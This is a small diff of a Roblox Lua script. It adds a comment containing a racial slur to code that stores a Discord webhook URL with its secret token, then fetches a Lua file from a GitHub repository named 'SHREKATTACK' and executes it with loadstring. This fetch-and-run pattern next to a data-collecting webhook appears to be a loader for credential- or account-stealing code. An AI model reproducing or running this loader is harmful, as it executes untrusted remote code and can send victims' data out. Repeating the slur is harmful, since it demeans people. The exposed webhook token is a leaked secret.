@@ -1,3 +1,6 @@
+--Cavehub Clicker nigga
+
+
 _G.webhooksdiscord = "https://discord.com/api/webhooks/1191255560142721084/mQlFLFsnh5Guc60yHKRRJnJKUl1Q65toO9HowcgdNx5Z9xEiRmOM0cDp0S47nGN0aZK7"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
 
